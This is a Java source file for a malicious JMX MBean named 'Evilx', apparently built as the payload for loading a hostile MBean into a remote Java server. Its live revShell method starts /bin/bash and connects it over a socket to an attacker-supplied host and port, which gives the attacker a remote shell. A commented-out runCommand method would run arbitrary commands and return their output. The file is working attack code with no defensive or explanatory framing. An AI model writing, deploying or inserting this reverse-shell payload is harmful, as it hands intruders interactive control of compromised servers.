import java.io.*;
import javax.management.*;
import java.net.*;

public class Evilx implements EvilxMBean {
    // public String runCommand(String cmd) {
    //     try {
    //         Runtime rt = Runtime.getRuntime();
    //         Process proc = rt.exec(cmd);
    //         BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    //         BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
    //         String stdout_err_data = "";
    //         String s;
    //         while ((s = stdInput.readLine()) != null) {
    //             stdout_err_data += s+"\n";
    //         }
    //         while ((s = stdError.readLine()) != null) {
    //             stdout_err_data += s+"\n";
    //         }

    //         proc.waitFor();
    //         return stdout_err_data;
    //     } catch (Exception e) {
    //         return e.toString();
    //     }
    // }

    public String revShell(String host) {
        try {
            String[] split = host.split(":");
            String hostname = split[0];
            int port = Integer.valueOf(split[1]);
            Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
            Socket s = new Socket(hostname, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
            p.destroy();
            s.close();
        } catch (Exception e) {
        }
        return "Goodbye!";
    }
}
